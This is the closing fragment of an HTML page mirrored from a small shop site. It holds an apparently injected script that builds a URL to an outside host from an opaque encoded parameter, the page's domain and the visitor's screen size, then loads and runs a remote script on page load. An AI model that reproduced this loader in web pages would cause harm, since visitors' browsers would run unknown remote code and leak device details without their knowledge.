                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXNDsq9AeROm6Hx%2bHs3Ct%2bpmsg5FXke8CwVTQkqyNze6erPgppFaUY6yWRMVqroX%2bXudRbverFrN3ZRpNL36S8bmu4PJejabyyZrJ0MIBq5wqoaWQ77WJ5t2hkk9JF5yBy8xbVRc2T02oJFLSysRRvL7XHRrlkrMEjj3GjCDcKm5hKbI%2flo1Gfoz2f4jiQi0qEdISy%2fsN79UJhCX4soqAzYDVMeajjmFkjZVXJ7gIq61AexcalJIsDEC%2fpddocLFtUpMNUMSD2xHNsYh%2bofUO%2freYAaYNEgPHS%2bQNAzeeCtVVWQLaYV7NQ9t1XTN5uzQ3umFX6%2fa1bQ2h8ZNMf0lMRRLFmVTMwfDewUnlBj9DAl3D64nrxTsgHSJVpHUCwOA60jOLYUSRWrWGR3CniPqorrJMdM5thop2BdU13pJpbGMfKisX%2bb15HDfhdXBY1FZ0FLzqk88DAPK1uae0CrMMGRg%3d%3d" + "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function() {});
        };
    </script>
</body>
<!-- Mirrored from kedai.supergoat.biz/toko/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jan 2020 15:47:39 GMT -->

</html>
